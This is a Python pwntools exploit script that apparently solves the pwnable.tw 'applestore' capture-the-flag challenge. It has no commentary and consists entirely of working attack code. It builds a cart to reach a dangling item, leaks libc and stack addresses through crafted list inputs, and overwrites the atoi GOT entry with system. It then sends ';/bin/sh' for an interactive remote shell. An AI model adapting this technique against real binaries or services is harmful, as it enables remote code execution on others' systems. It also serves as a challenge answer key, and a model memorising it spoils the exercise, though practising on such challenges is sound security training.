from pwn import *

#>>> 299*20 + 199*6
#r = process("./applestore.orig")

r = remote("chall.pwnable.tw",10104)

pause()

readgot  = 0x804b00c
atoigot = 0x0804b040
addr  = 0x0804b070

def add(dnum,):
	r.sendline("2")
	r.recvuntil(">")
	r.sendline(str(dnum))
	r.recvuntil(">")

def list(data):
	r.sendline("4")
	r.recvuntil("(y/n)")
	r.sendline(data)
def checkout():
	r.sendline("5")
	r.recvuntil("(y/n)")
	r.sendline("y")

def dele(pld):
	r.sendline("3")
	r.recvuntil(">")
	r.sendline(pld)


for i in range(0,20):
	add(2)

for i in range(6):
	add(1)

checkout()

list("y\x00"+p32(readgot)+p32(1337)+p32(0)*2) # LIBC LEAK


r.recvuntil("27: ")
libc_leak = u32(r.recvline()[:4])
libc_base = libc_leak -  0xd41c0 #0xe57b0
env = libc_base +  0x1b1dbc #0x1d6dd8
#ONE_SHOT = libc_base + 0x5f066
system = libc_base + 0x3a940 #0x3cd10

print 'libc base @',hex(libc_base)
print "env @",hex(env)

list("y\x00"+p32(env)+p32(1337)+p32(0)*2) #STACK LEAK
r.recvuntil("27: ")
stack_leak = u32(r.recvline()[:4])

ebp = stack_leak - 260


pld = "27"
pld += p32(addr)
pld += p32(1337)
pld += p32(atoigot + 0x22)
pld += p32(ebp-0x8)

dele(pld)
r.recvuntil(">")
r.sendline(p32(system)+";/bin/sh\x00")

r.interactive()
